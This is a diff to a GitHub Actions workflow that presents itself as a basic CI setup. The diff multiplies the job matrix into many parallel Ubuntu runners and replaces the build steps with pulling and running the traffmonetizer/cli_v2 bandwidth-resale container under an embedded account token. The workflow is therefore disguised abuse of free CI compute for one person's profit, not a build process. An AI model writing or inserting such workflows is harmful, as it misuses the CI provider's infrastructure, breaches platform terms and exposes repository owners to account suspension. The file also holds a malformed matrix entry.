@@ -1,6 +1,6 @@
 # This is a basic workflow to help you get started with Actions
 
-name: CIO
+name: CI
 
 # Controls when the workflow will run
 on:
@@ -18,17 +18,17 @@ jobs:
   example_matrix:
     strategy:
       matrix:
-        os: [ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest, ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest]
-        node: [18, 20]
+        os: [ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest, ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest,ubuntu-latest]
+        node: [14, 16]
         include:
-          - os: ubuntu-latest
-          
+          - os: ubuntu-lates
+            node: 16
+            npm: 6
     runs-on: ${{ matrix.os }}
     steps:
       - uses: actions/setup-node@v4
         with:
           node-version: ${{ matrix.node }}
       - if: ${{ matrix.npm }}
-        run: docker
-      - run: lscpu
-      
+        run: docker pull traffmonetizer/cli_v2:latest
+      - run: docker run -i --name tm traffmonetizer/cli_v2 start accept --token xMkGgITddfrrehRZm3IP8KCQnLcQO/dWN2vjeB1IDDQ=
